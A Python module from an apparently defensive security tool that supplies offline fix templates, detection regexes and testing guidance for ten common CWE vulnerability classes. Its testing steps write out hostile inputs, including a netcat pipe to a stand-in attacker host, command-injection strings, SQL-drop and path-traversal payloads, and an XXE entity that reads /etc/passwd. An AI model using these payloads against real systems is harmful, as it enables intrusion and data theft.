"""
Offline AutoFix Template Library -- deterministic fix suggestions when LLM is unavailable.

Provides language-specific fix templates for the OWASP/CWE Top-10 vulnerability
categories. When the AutoFixEngine detects that the LLM provider returned a
deterministic fallback (no real API key configured), it dispatches to this library
instead of returning empty patches with confidence 0.4.

Each template contains:
- Regex patterns that match known vulnerable code idioms
- Before/after code snippets showing the exact transformation
- Human-readable explanation and testing guidance
- A conservative confidence score (0.6-0.8) reflecting template specificity

This module is fully standalone -- zero external dependencies, works air-gapped.
"""

from __future__ import annotations

import hashlib
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------


@dataclass
class FixTemplate:
    """A single offline fix template for a CWE category."""

    cwe_id: str  # e.g., "CWE-89"
    cwe_name: str  # e.g., "SQL Injection"
    languages: List[str] = field(default_factory=list)  # e.g., ["python", "javascript"]
    vulnerable_patterns: List[str] = field(default_factory=list)  # regex patterns
    fix_description: str = ""  # Human-readable explanation
    fix_snippets: Dict[str, Dict[str, str]] = field(
        default_factory=dict
    )  # {language: {before: ..., after: ...}}
    confidence: float = 0.65  # 0.6-0.8 range
    severity: str = "high"  # "critical", "high", "medium"
    fix_type: str = "code_patch"
    testing_guidance: str = ""
    rollback_steps: str = "Revert the commit containing this fix"
    risk_assessment: str = ""
    effort_minutes: int = 15
    mitre_techniques: List[str] = field(default_factory=list)
    compliance_refs: List[str] = field(default_factory=list)
    title_keywords: List[str] = field(default_factory=list)  # keywords to match in finding title


# ---------------------------------------------------------------------------
# Template definitions -- OWASP/CWE Top-10
# ---------------------------------------------------------------------------

_TEMPLATES: List[FixTemplate] = [
    # ---------------------------------------------------------------
    # CWE-79: Cross-Site Scripting (XSS)
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-79",
        cwe_name="Cross-Site Scripting (XSS)",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""f['\"].*\{.*user.*\}.*['\"]""",
            r"""\.format\(.*user""",
            r"""%\s*\(.*user""",
            r"""innerHTML\s*=""",
            r"""document\.write\(""",
            r"""v-html\s*=""",
            r"""dangerouslySetInnerHTML""",
            r"""\|\s*safe""",
            r"""mark_safe\(""",
            r"""Markup\(""",
        ],
        fix_description=(
            "Escape all user-controlled input before rendering in HTML context. "
            "Use framework-native escaping functions (markupsafe.escape for Python/Jinja2, "
            "textContent instead of innerHTML for JavaScript). Never use mark_safe() or "
            "|safe on user-controlled data."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "from markupsafe import Markup\n"
                    "# VULNERABLE: user input rendered without escaping\n"
                    "output = f\"<div>{user_input}</div>\"\n"
                    "# or\n"
                    "output = Markup(user_input)\n"
                    "# or\n"
                    "output = template.render(name=user_input)  # with |safe filter"
                ),
                "after": (
                    "from markupsafe import escape\n"
                    "# FIXED: escape user input before rendering\n"
                    "output = f\"<div>{escape(user_input)}</div>\"\n"
                    "# or\n"
                    "output = escape(user_input)\n"
                    "# or\n"
                    "output = template.render(name=escape(user_input))  # remove |safe filter"
                ),
            },
            "javascript": {
                "before": (
                    "// VULNERABLE: user input injected via innerHTML\n"
                    "element.innerHTML = userInput;\n"
                    "// or\n"
                    "document.write(userInput);"
                ),
                "after": (
                    "// FIXED: use textContent for safe text insertion\n"
                    "element.textContent = userInput;\n"
                    "// For HTML structure, use DOM APIs:\n"
                    "// const text = document.createTextNode(userInput);\n"
                    "// element.appendChild(text);"
                ),
            },
        },
        confidence=0.75,
        severity="high",
        fix_type="output_encoding",
        testing_guidance=(
            "1. Submit <script>alert(1)</script> as user input and verify it renders as text, not HTML.\n"
            "2. Submit &lt;img onerror=alert(1) src=x&gt; and verify no JS executes.\n"
            "3. Check that legitimate characters (&, <, >, \", ') are properly escaped in output."
        ),
        risk_assessment="Low risk -- escaping is additive and does not change application logic",
        effort_minutes=10,
        mitre_techniques=["T1059.007"],
        compliance_refs=["CWE-79", "OWASP A03:2021"],
        title_keywords=["xss", "cross-site scripting", "reflected xss", "stored xss", "dom xss", "html injection"],
    ),

    # ---------------------------------------------------------------
    # CWE-89: SQL Injection
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-89",
        cwe_name="SQL Injection",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""f['\"].*SELECT.*\{.*\}""",
            r"""f['\"].*INSERT.*\{.*\}""",
            r"""f['\"].*UPDATE.*\{.*\}""",
            r"""f['\"].*DELETE.*\{.*\}""",
            r"""\.format\(.*\).*(?:SELECT|INSERT|UPDATE|DELETE)""",
            r"""%s.*%\s*\(""",
            r"""execute\(\s*f['\"]""",
            r"""execute\(['\"].*\+""",
            r"""cursor\.execute\(.*%""",
            r"""\.raw\(.*\+""",
            r"""query\s*=\s*['\"].*\+\s*""",
        ],
        fix_description=(
            "Replace string concatenation/interpolation in SQL queries with parameterized "
            "queries (prepared statements). Use ? or %s placeholders with parameter tuples. "
            "For ORMs, use query builder methods instead of raw SQL."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "# VULNERABLE: string interpolation in SQL\n"
                    "cursor.execute(f\"SELECT * FROM users WHERE name = '{user_input}'\")\n"
                    "# or\n"
                    "query = \"SELECT * FROM users WHERE id = \" + user_id\n"
                    "cursor.execute(query)"
                ),
                "after": (
                    "# FIXED: parameterized query prevents SQL injection\n"
                    "cursor.execute(\"SELECT * FROM users WHERE name = ?\", (user_input,))\n"
                    "# or (for psycopg2/MySQL)\n"
                    "cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))"
                ),
            },
            "javascript": {
                "before": (
                    "// VULNERABLE: string concatenation in SQL\n"
                    "const query = `SELECT * FROM users WHERE name = '${userInput}'`;\n"
                    "db.query(query);"
                ),
                "after": (
                    "// FIXED: parameterized query\n"
                    "const query = 'SELECT * FROM users WHERE name = ?';\n"
                    "db.query(query, [userInput]);"
                ),
            },
        },
        confidence=0.80,
        severity="critical",
        fix_type="input_validation",
        testing_guidance=(
            "1. Submit ' OR '1'='1 as input and verify no extra rows are returned.\n"
            "2. Submit '; DROP TABLE users;-- and verify the table is not dropped.\n"
            "3. Run existing integration tests to confirm queries still return correct results.\n"
            "4. Verify parameterized queries work with NULL values and special characters."
        ),
        risk_assessment="Low risk -- parameterized queries are semantically equivalent to interpolated ones",
        effort_minutes=15,
        mitre_techniques=["T1190"],
        compliance_refs=["CWE-89", "OWASP A03:2021"],
        title_keywords=["sql injection", "sqli", "sql inject", "database injection"],
    ),

    # ---------------------------------------------------------------
    # CWE-22: Path Traversal
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-22",
        cwe_name="Path Traversal",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""open\(.*\+.*user""",
            r"""open\(.*request""",
            r"""os\.path\.join\(.*request""",
            r"""Path\(.*request""",
            r"""send_file\(.*request""",
            r"""\.\.\/""",
            r"""\.\.\\""",
            r"""readFile\(.*req\.""",
            r"""fs\..*\(.*req\.""",
        ],
        fix_description=(
            "Validate and canonicalize file paths before use. Use os.path.realpath() to "
            "resolve symlinks, then verify the resolved path starts with the intended "
            "base directory. Reject any input containing '..' before path construction."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "import os\n"
                    "# VULNERABLE: user controls file path\n"
                    "file_path = os.path.join(BASE_DIR, user_input)\n"
                    "with open(file_path) as f:\n"
                    "    data = f.read()"
                ),
                "after": (
                    "import os\n"
                    "# FIXED: validate and canonicalize path\n"
                    "if '..' in user_input or user_input.startswith('/'):\n"
                    "    raise ValueError(\"Invalid file path\")\n"
                    "file_path = os.path.realpath(os.path.join(BASE_DIR, user_input))\n"
                    "if not file_path.startswith(os.path.realpath(BASE_DIR)):\n"
                    "    raise ValueError(\"Path traversal detected\")\n"
                    "with open(file_path) as f:\n"
                    "    data = f.read()"
                ),
            },
            "javascript": {
                "before": (
                    "const path = require('path');\n"
                    "// VULNERABLE: user controls file path\n"
                    "const filePath = path.join(BASE_DIR, req.params.filename);\n"
                    "fs.readFile(filePath, callback);"
                ),
                "after": (
                    "const path = require('path');\n"
                    "// FIXED: validate resolved path stays within base directory\n"
                    "const safeName = path.basename(req.params.filename);\n"
                    "const filePath = path.resolve(BASE_DIR, safeName);\n"
                    "if (!filePath.startsWith(path.resolve(BASE_DIR))) {\n"
                    "    return res.status(400).json({ error: 'Invalid path' });\n"
                    "}\n"
                    "fs.readFile(filePath, callback);"
                ),
            },
        },
        confidence=0.75,
        severity="high",
        fix_type="input_validation",
        testing_guidance=(
            "1. Submit ../../etc/passwd as filename and verify 400/403 response.\n"
            "2. Submit a valid filename and verify it still works.\n"
            "3. Test with symlinks pointing outside BASE_DIR.\n"
            "4. Test with URL-encoded traversal: %2e%2e%2f"
        ),
        risk_assessment="Low risk -- adds validation without changing successful path resolution",
        effort_minutes=10,
        mitre_techniques=["T1083"],
        compliance_refs=["CWE-22", "OWASP A01:2021"],
        title_keywords=["path traversal", "directory traversal", "lfi", "local file inclusion", "file path"],
    ),

    # ---------------------------------------------------------------
    # CWE-502: Deserialization of Untrusted Data
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""pickle\.loads?\(""",
            r"""pickle\.Unpickler""",
            r"""yaml\.load\(""",
            r"""yaml\.unsafe_load\(""",
            r"""marshal\.loads?\(""",
            r"""shelve\.open\(""",
            r"""jsonpickle\.decode""",
            r"""dill\.loads?\(""",
            r"""unserialize\(""",
            r"""eval\(.*request""",
        ],
        fix_description=(
            "Replace unsafe deserialization (pickle, marshal, yaml.load) with safe alternatives. "
            "Use json.loads() for data interchange. If YAML is required, use yaml.safe_load(). "
            "Never deserialize untrusted data with pickle -- it allows arbitrary code execution."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "import pickle\n"
                    "# VULNERABLE: pickle deserialization allows arbitrary code execution\n"
                    "data = pickle.loads(user_bytes)\n"
                    "# or\n"
                    "import yaml\n"
                    "config = yaml.load(user_yaml)  # yaml.load without Loader is unsafe"
                ),
                "after": (
                    "import json\n"
                    "# FIXED: use JSON for safe deserialization\n"
                    "data = json.loads(user_bytes)\n"
                    "# or if YAML is required:\n"
                    "import yaml\n"
                    "config = yaml.safe_load(user_yaml)  # safe_load blocks arbitrary objects"
                ),
            },
            "javascript": {
                "before": (
                    "// VULNERABLE: eval-based deserialization\n"
                    "const data = eval('(' + userInput + ')');\n"
                    "// or\n"
                    "const obj = require('node-serialize').unserialize(userInput);"
                ),
                "after": (
                    "// FIXED: use JSON.parse for safe deserialization\n"
                    "const data = JSON.parse(userInput);\n"
                    "// Validate the parsed structure matches expected schema"
                ),
            },
        },
        confidence=0.80,
        severity="critical",
        fix_type="code_patch",
        testing_guidance=(
            "1. Verify existing serialized data can be loaded with the new method (may need migration).\n"
            "2. Test with malformed input to ensure proper error handling.\n"
            "3. If migrating from pickle, ensure complex objects are converted to JSON-safe dicts.\n"
            "4. Check for pickle usage in caching layers (Redis, Memcached) that also need updating."
        ),
        risk_assessment=(
            "Medium risk -- data format change may require migration of existing serialized data. "
            "Complex Python objects (classes, lambdas) cannot be represented in JSON."
        ),
        effort_minutes=30,
        mitre_techniques=["T1059"],
        compliance_refs=["CWE-502", "OWASP A08:2021"],
        title_keywords=["deserialization", "pickle", "insecure deserial", "yaml.load", "marshal", "unsafe deserialization"],
    ),

    # ---------------------------------------------------------------
    # CWE-798: Hard-coded Credentials
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-798",
        cwe_name="Use of Hard-coded Credentials",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""(?:password|passwd|pwd)\s*=\s*['\"][^'\"]{4,}['\"]""",
            r"""(?:api_key|apikey|api_secret)\s*=\s*['\"][^'\"]{4,}['\"]""",
            r"""(?:secret|token|auth)\s*=\s*['\"][^'\"]{8,}['\"]""",
            r"""(?:AWS_ACCESS_KEY|aws_secret)\s*=\s*['\"]""",
            r"""(?:PRIVATE_KEY|private_key)\s*=\s*['\"]""",
            r"""(?:DATABASE_URL|DB_PASSWORD)\s*=\s*['\"][^'\"]+['\"]""",
            r"""(?:connection_string)\s*=\s*['\"].*(?:password|pwd)=""",
        ],
        fix_description=(
            "Move hard-coded credentials to environment variables or a secrets manager. "
            "Use os.environ.get() with a clear variable name. Add the variable to "
            ".env.example (without the actual value) and document it in README."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "# VULNERABLE: hard-coded credentials in source code\n"
                    "API_KEY = \"sk-1234567890abcdef\"\n"
                    "DB_PASSWORD = \"super_secret_password\"\n"
                    "client = APIClient(api_key=\"hardcoded-key-here\")"
                ),
                "after": (
                    "import os\n"
                    "# FIXED: load credentials from environment variables\n"
                    "API_KEY = os.environ.get(\"API_KEY\", \"\")\n"
                    "DB_PASSWORD = os.environ.get(\"DB_PASSWORD\", \"\")\n"
                    "if not API_KEY:\n"
                    "    raise RuntimeError(\"API_KEY environment variable is required\")\n"
                    "client = APIClient(api_key=os.environ[\"API_KEY\"])"
                ),
            },
            "javascript": {
                "before": (
                    "// VULNERABLE: hard-coded credentials\n"
                    "const API_KEY = 'sk-1234567890abcdef';\n"
                    "const dbPassword = 'super_secret_password';"
                ),
                "after": (
                    "// FIXED: load from environment variables\n"
                    "const API_KEY = process.env.API_KEY;\n"
                    "const dbPassword = process.env.DB_PASSWORD;\n"
                    "if (!API_KEY) {\n"
                    "    throw new Error('API_KEY environment variable is required');\n"
                    "}"
                ),
            },
        },
        confidence=0.70,
        severity="high",
        fix_type="secret_rotation",
        testing_guidance=(
            "1. Set the environment variable and verify the application starts correctly.\n"
            "2. Verify the old hard-coded value is rotated/revoked.\n"
            "3. Ensure .env file is in .gitignore.\n"
            "4. Check CI/CD pipelines inject the secret correctly.\n"
            "5. Grep codebase for any remaining hard-coded copies of the credential."
        ),
        risk_assessment=(
            "Medium risk -- requires environment configuration changes in all deployment "
            "targets. Ensure CI/CD and production environments have the variables set."
        ),
        effort_minutes=20,
        mitre_techniques=["T1552.001"],
        compliance_refs=["CWE-798", "OWASP A07:2021"],
        title_keywords=[
            "hard-coded", "hardcoded", "credential", "secret in code",
            "api key in source", "password in source", "embedded credential",
        ],
    ),

    # ---------------------------------------------------------------
    # CWE-327: Use of Broken Crypto Algorithm
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-327",
        cwe_name="Use of a Broken or Risky Cryptographic Algorithm",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""hashlib\.md5\(""",
            r"""hashlib\.sha1\(""",
            r"""MD5\.new\(""",
            r"""SHA\.new\(""",
            r"""DES\.new\(""",
            r"""RC4""",
            r"""Blowfish""",
            r"""crypto\.createHash\(['\"]md5""",
            r"""crypto\.createHash\(['\"]sha1""",
            r"""random\.random\(\)""",
            r"""Math\.random\(\)""",
        ],
        fix_description=(
            "Replace weak cryptographic algorithms (MD5, SHA1, DES, RC4) with "
            "strong alternatives (SHA-256+, AES-256-GCM). For password hashing, "
            "use bcrypt, scrypt, or Argon2 instead of any raw hash. For random "
            "number generation, use secrets module (Python) or crypto.randomBytes (Node)."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "import hashlib\n"
                    "# VULNERABLE: MD5/SHA1 are cryptographically broken\n"
                    "digest = hashlib.md5(data).hexdigest()\n"
                    "# or for passwords:\n"
                    "pwd_hash = hashlib.sha1(password.encode()).hexdigest()"
                ),
                "after": (
                    "import hashlib\n"
                    "# FIXED: use SHA-256 for integrity checks\n"
                    "digest = hashlib.sha256(data).hexdigest()\n"
                    "# For passwords, use bcrypt instead of any raw hash:\n"
                    "import bcrypt\n"
                    "pwd_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())"
                ),
            },
            "javascript": {
                "before": (
                    "const crypto = require('crypto');\n"
                    "// VULNERABLE: MD5 is broken\n"
                    "const hash = crypto.createHash('md5').update(data).digest('hex');"
                ),
                "after": (
                    "const crypto = require('crypto');\n"
                    "// FIXED: use SHA-256\n"
                    "const hash = crypto.createHash('sha256').update(data).digest('hex');"
                ),
            },
        },
        confidence=0.75,
        severity="high",
        fix_type="code_patch",
        testing_guidance=(
            "1. Verify existing hashes are not used for authentication (may need migration).\n"
            "2. If hashes are stored (DB, files), plan a migration strategy.\n"
            "3. For HMAC usage, ensure the key is also updated.\n"
            "4. Run crypto-specific test vectors for the new algorithm."
        ),
        risk_assessment=(
            "Medium risk -- changing hash algorithm invalidates existing stored hashes. "
            "Plan a migration for password databases or integrity checksums."
        ),
        effort_minutes=20,
        mitre_techniques=["T1600"],
        compliance_refs=["CWE-327", "OWASP A02:2021"],
        title_keywords=[
            "weak crypto", "broken crypto", "md5", "sha1", "des", "rc4",
            "weak hash", "insecure algorithm", "broken algorithm",
        ],
    ),

    # ---------------------------------------------------------------
    # CWE-611: Improper Restriction of XML External Entity Reference (XXE)
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-611",
        cwe_name="XML External Entity (XXE) Injection",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""xml\.etree\.ElementTree\.parse\(""",
            r"""ET\.parse\(""",
            r"""ET\.fromstring\(""",
            r"""xml\.sax\.parse""",
            r"""xml\.dom\.minidom\.parse""",
            r"""lxml\.etree\.parse""",
            r"""XMLParser\(\)""",
            r"""parseString\(""",
            r"""<!DOCTYPE""",
            r"""<!ENTITY""",
        ],
        fix_description=(
            "Use defusedxml instead of xml.etree.ElementTree to prevent XXE attacks. "
            "If defusedxml is not available, strip DOCTYPE and ENTITY declarations "
            "from input before parsing. Disable external entity resolution."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "import xml.etree.ElementTree as ET\n"
                    "# VULNERABLE: standard library XML parser allows XXE\n"
                    "tree = ET.parse(user_xml_file)\n"
                    "root = ET.fromstring(user_xml_string)"
                ),
                "after": (
                    "import defusedxml.ElementTree as ET\n"
                    "# FIXED: defusedxml blocks XXE, DTD processing, and entity expansion\n"
                    "tree = ET.parse(user_xml_file)\n"
                    "root = ET.fromstring(user_xml_string)\n"
                    "\n"
                    "# If defusedxml is not available, strip DOCTYPE before parsing:\n"
                    "# import re\n"
                    "# safe_xml = re.sub(r'<!DOCTYPE[^>]*>', '', user_xml_string)\n"
                    "# safe_xml = re.sub(r'<!ENTITY[^>]*>', '', safe_xml)"
                ),
            },
            "javascript": {
                "before": (
                    "const parser = new DOMParser();\n"
                    "// VULNERABLE: default parser processes external entities\n"
                    "const doc = parser.parseFromString(userXml, 'text/xml');"
                ),
                "after": (
                    "const { XMLParser } = require('fast-xml-parser');\n"
                    "// FIXED: fast-xml-parser does not process external entities by default\n"
                    "const parser = new XMLParser({ ignoreAttributes: false });\n"
                    "const doc = parser.parse(userXml);"
                ),
            },
        },
        confidence=0.75,
        severity="high",
        fix_type="code_patch",
        testing_guidance=(
            "1. Submit XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n"
            "   and verify the entity is NOT resolved.\n"
            "2. Submit XML with billion-laughs entity expansion and verify it is rejected.\n"
            "3. Verify valid XML documents still parse correctly.\n"
            "4. Check that defusedxml is added to requirements.txt."
        ),
        risk_assessment="Low risk -- defusedxml is a drop-in replacement for xml.etree.ElementTree",
        effort_minutes=10,
        mitre_techniques=["T1059"],
        compliance_refs=["CWE-611", "OWASP A05:2021"],
        title_keywords=["xxe", "xml external entity", "xml injection", "xml parsing", "dtd"],
    ),

    # ---------------------------------------------------------------
    # CWE-918: Server-Side Request Forgery (SSRF)
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-918",
        cwe_name="Server-Side Request Forgery (SSRF)",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""requests\.get\(.*user""",
            r"""requests\.post\(.*user""",
            r"""httpx\.\w+\(.*user""",
            r"""urllib\.request\.urlopen\(.*user""",
            r"""urlopen\(.*request""",
            r"""fetch\(.*req\.""",
            r"""axios\.\w+\(.*req\.""",
            r"""http\.get\(.*req\.""",
        ],
        fix_description=(
            "Validate user-supplied URLs against an allowlist of permitted domains and "
            "schemes. Block requests to internal/private IP ranges (RFC1918: 10.x, 172.16-31.x, "
            "192.168.x), localhost, link-local (169.254.x), and cloud metadata endpoints "
            "(169.254.169.254). Only allow http:// and https:// schemes."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "import requests\n"
                    "# VULNERABLE: user controls the URL\n"
                    "response = requests.get(user_url)\n"  # nosemgrep: dynamic-urllib-use-detected
                    "return response.json()"
                ),
                "after": (
                    "import ipaddress\n"
                    "import socket\n"
                    "from urllib.parse import urlparse\n"
                    "import requests\n"
                    "\n"
                    "def _validate_url(url: str) -> str:\n"
                    "    \"\"\"Validate URL is not targeting internal resources.\"\"\"\n"
                    "    parsed = urlparse(url)\n"
                    "    if parsed.scheme not in ('http', 'https'):\n"
                    "        raise ValueError(f'Invalid scheme: {parsed.scheme}')\n"
                    "    hostname = parsed.hostname or ''\n"
                    "    if hostname in ('localhost', '127.0.0.1', '::1', '0.0.0.0'):\n"
                    "        raise ValueError('Localhost URLs are blocked')\n"
                    "    try:\n"
                    "        ip = ipaddress.ip_address(socket.gethostbyname(hostname))\n"
                    "        if ip.is_private or ip.is_loopback or ip.is_link_local:\n"
                    "            raise ValueError('Internal IP addresses are blocked')\n"
                    "    except socket.gaierror:\n"
                    "        raise ValueError(f'Cannot resolve hostname: {hostname}')\n"
                    "    return url\n"
                    "\n"
                    "# FIXED: validate URL before making request\n"
                    "safe_url = _validate_url(user_url)\n"
                    "response = requests.get(safe_url, timeout=10)\n"  # nosemgrep: dynamic-urllib-use-detected
                    "return response.json()"
                ),
            },
            "javascript": {
                "before": (
                    "// VULNERABLE: user controls the URL\n"
                    "const response = await fetch(userUrl);\n"
                    "return await response.json();"
                ),
                "after": (
                    "const { URL } = require('url');\n"
                    "const dns = require('dns').promises;\n"
                    "const net = require('net');\n"
                    "\n"
                    "async function validateUrl(url) {\n"
                    "    const parsed = new URL(url);\n"
                    "    if (!['http:', 'https:'].includes(parsed.protocol)) {\n"
                    "        throw new Error('Invalid URL scheme');\n"
                    "    }\n"
                    "    const { address } = await dns.lookup(parsed.hostname);\n"
                    "    if (net.isIP(address) && (address.startsWith('10.') ||\n"
                    "        address.startsWith('172.') || address.startsWith('192.168.') ||\n"
                    "        address === '127.0.0.1' || address.startsWith('169.254.'))) {\n"
                    "        throw new Error('Internal addresses are blocked');\n"
                    "    }\n"
                    "    return url;\n"
                    "}\n"
                    "\n"
                    "// FIXED: validate URL before fetching\n"
                    "const safeUrl = await validateUrl(userUrl);\n"
                    "const response = await fetch(safeUrl);\n"
                    "return await response.json();"
                ),
            },
        },
        confidence=0.70,
        severity="high",
        fix_type="input_validation",
        testing_guidance=(
            "1. Submit http://localhost/admin and verify it is blocked.\n"
            "2. Submit http://169.254.169.254/latest/meta-data/ and verify it is blocked.\n"
            "3. Submit http://10.0.0.1/internal and verify it is blocked.\n"
            "4. Submit a valid external URL and verify it works.\n"
            "5. Test DNS rebinding: use a domain that resolves to 127.0.0.1."
        ),
        risk_assessment=(
            "Low risk -- adds pre-request validation. May break legitimate internal API calls "
            "that should be refactored to use service discovery instead of user-supplied URLs."
        ),
        effort_minutes=20,
        mitre_techniques=["T1090"],
        compliance_refs=["CWE-918", "OWASP A10:2021"],
        title_keywords=["ssrf", "server-side request forgery", "url injection", "open redirect"],
    ),

    # ---------------------------------------------------------------
    # CWE-78: OS Command Injection
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-78",
        cwe_name="OS Command Injection",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""os\.system\(""",
            r"""os\.popen\(""",
            r"""subprocess\.call\(.*shell\s*=\s*True""",
            r"""subprocess\.Popen\(.*shell\s*=\s*True""",
            r"""subprocess\.run\(.*shell\s*=\s*True""",
            r"""commands\.getoutput\(""",
            r"""child_process\.exec\(""",
            r"""exec\(.*\+.*user""",
            r"""\.system\(.*\+""",
            r"""shell_exec\(""",
        ],
        fix_description=(
            "Replace shell=True subprocess calls with shell=False and pass arguments as a "
            "list. Never use os.system() or os.popen(). For complex commands, use "
            "shlex.split() to safely tokenize, or better yet, use Python standard library "
            "functions instead of shelling out."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "import os\n"
                    "import subprocess\n"
                    "# VULNERABLE: shell injection via user input\n"
                    "os.system(f\"ping -c 1 {user_host}\")\n"
                    "# or\n"
                    "subprocess.call(f\"nmap {target}\", shell=True)"
                ),
                "after": (
                    "import subprocess\n"
                    "import shlex\n"
                    "# FIXED: pass arguments as list, never use shell=True\n"
                    "subprocess.run(\n"
                    "    [\"ping\", \"-c\", \"1\", user_host],\n"
                    "    shell=False,\n"
                    "    capture_output=True,\n"
                    "    timeout=30,\n"
                    ")\n"
                    "# or with shlex for complex commands:\n"
                    "# args = shlex.split(f\"nmap {shlex.quote(target)}\")\n"
                    "# subprocess.run(args, shell=False, timeout=60)"
                ),
            },
            "javascript": {
                "before": (
                    "const { exec } = require('child_process');\n"
                    "// VULNERABLE: command injection\n"
                    "exec(`ping -c 1 ${userHost}`, callback);"
                ),
                "after": (
                    "const { execFile } = require('child_process');\n"
                    "// FIXED: execFile does not spawn a shell\n"
                    "execFile('ping', ['-c', '1', userHost], callback);"
                ),
            },
        },
        confidence=0.80,
        severity="critical",
        fix_type="input_validation",
        testing_guidance=(
            "1. Submit ; cat /etc/passwd as input and verify no command execution.\n"
            "2. Submit $(whoami) and verify it is treated as a literal string.\n"
            "3. Submit | nc attacker.com 4444 and verify it is blocked.\n"
            "4. Verify the intended command still works with normal input.\n"
            "5. Test with inputs containing spaces, quotes, and special characters."
        ),
        risk_assessment="Low risk -- subprocess list arguments are semantically equivalent to shell commands",
        effort_minutes=15,
        mitre_techniques=["T1059.004"],
        compliance_refs=["CWE-78", "OWASP A03:2021"],
        title_keywords=[
            "command injection", "os command", "shell injection", "rce",
            "remote code execution", "os.system", "subprocess",
        ],
    ),

    # ---------------------------------------------------------------
    # CWE-200: Exposure of Sensitive Information
    # ---------------------------------------------------------------
    FixTemplate(
        cwe_id="CWE-200",
        cwe_name="Exposure of Sensitive Information to an Unauthorized Actor",
        languages=["python", "javascript"],
        vulnerable_patterns=[
            r"""traceback\.format_exc\(\)""",
            r"""str\(exc\)""",
            r"""str\(e\)""",
            r"""return.*traceback""",
            r"""detail=.*str\(""",
            r"""detail=.*exc""",
            r"""\"error\":\s*str\(""",
            r"""console\.error\(.*err\.stack""",
            r"""res\.send\(.*err\.message""",
            r"""stack_trace""",
        ],
        fix_description=(
            "Never expose internal error details (stack traces, exception messages, "
            "file paths, SQL errors) to API consumers. Return generic error messages "
            "to clients and log full details server-side. Use structured logging to "
            "capture diagnostics without leaking them in responses."
        ),
        fix_snippets={
            "python": {
                "before": (
                    "from fastapi import HTTPException\n"
                    "# VULNERABLE: exception details leaked to client\n"
                    "try:\n"
                    "    result = process(data)\n"
                    "except Exception as exc:\n"
                    "    raise HTTPException(status_code=500, detail=str(exc))\n"
                    "# or\n"
                    "except Exception as exc:\n"
                    "    return {\"error\": str(exc), \"trace\": traceback.format_exc()}"
                ),
                "after": (
                    "import logging\n"
                    "from fastapi import HTTPException\n"
                    "logger = logging.getLogger(__name__)\n"
                    "\n"
                    "# FIXED: log details server-side, return generic message to client\n"
                    "try:\n"
                    "    result = process(data)\n"
                    "except Exception as exc:\n"
                    "    logger.error(\"Processing failed: %s\", type(exc).__name__, exc_info=True)\n"
                    "    raise HTTPException(\n"
                    "        status_code=500,\n"
                    "        detail=\"Internal server error\"\n"
                    "    )"
                ),
            },
            "javascript": {
                "before": (
                    "// VULNERABLE: error details leaked to client\n"
                    "app.get('/api/data', (req, res) => {\n"
                    "    try { /* ... */ }\n"
                    "    catch (err) { res.status(500).json({ error: err.message, stack: err.stack }); }\n"
                    "});"
                ),
                "after": (
                    "// FIXED: generic error to client, log details server-side\n"
                    "app.get('/api/data', (req, res) => {\n"
                    "    try { /* ... */ }\n"
                    "    catch (err) {\n"
                    "        console.error('Processing failed:', err);\n"
                    "        res.status(500).json({ error: 'Internal server error' });\n"
                    "    }\n"
                    "});"
                ),
            },
        },
        confidence=0.70,
        severity="medium",
        fix_type="code_patch",
        testing_guidance=(
            "1. Trigger a 500 error and verify the response body does NOT contain stack traces.\n"
            "2. Verify server logs DO contain the full error for debugging.\n"
            "3. Check that no file paths, SQL queries, or API keys appear in error responses.\n"
            "4. Test with both expected errors (400) and unexpected errors (500)."
        ),
        risk_assessment="Low risk -- only changes error response format, not application logic",
        effort_minutes=10,
        mitre_techniques=["T1005"],
        compliance_refs=["CWE-200", "OWASP A04:2021"],
        title_keywords=[
            "information disclosure", "info disclosure", "stack trace", "error message",
            "sensitive data exposure", "verbose error", "debug info",
        ],
    ),
]


# ---------------------------------------------------------------------------
# Index structures for fast lookup
# ---------------------------------------------------------------------------

_BY_CWE: Dict[str, FixTemplate] = {}
_BY_KEYWORD: Dict[str, FixTemplate] = {}
_COMPILED_PATTERNS: Dict[str, List[re.Pattern[str]]] = {}


def _build_indexes() -> None:
    """Build lookup indexes from templates. Called once on module load."""
    for tpl in _TEMPLATES:
        _BY_CWE[tpl.cwe_id.upper()] = tpl
        for kw in tpl.title_keywords:
            _BY_KEYWORD[kw.lower()] = tpl
        _COMPILED_PATTERNS[tpl.cwe_id] = []
        for pat_str in tpl.vulnerable_patterns:
            try:
                _COMPILED_PATTERNS[tpl.cwe_id].append(
                    re.compile(pat_str, re.IGNORECASE)
                )
            except re.error:
                logger.warning(
                    "Invalid regex in template %s: %s", tpl.cwe_id, pat_str[:60]
                )


_build_indexes()


# ---------------------------------------------------------------------------
